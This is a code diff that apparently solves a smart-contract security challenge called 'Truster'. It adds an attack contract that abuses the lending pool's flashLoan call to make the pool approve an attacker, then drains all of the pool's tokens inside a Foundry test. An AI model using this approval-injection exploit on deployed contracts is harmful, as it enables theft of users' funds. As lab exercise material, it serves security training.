@@ -41,7 +41,11 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        TrusterAttack ta = new TrusterAttack();
+        ta.attack(address(trusterLenderPool), address(dvt), TOKENS_IN_POOL);
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -53,5 +57,14 @@ contract Truster is Test {
         // Attacker has taken all tokens from the pool
         assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
         assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
+    }
+}
+
+contract TrusterAttack {
+    function attack(address poolAddr, address tokenAddr, uint256 approveAmount) public {
+        TrusterLenderPool pool = TrusterLenderPool(poolAddr);
+        pool.flashLoan(
+            0, msg.sender, tokenAddr, abi.encodeWithSignature("approve(address,uint256)", msg.sender, approveAmount)
+        );
     }
 }
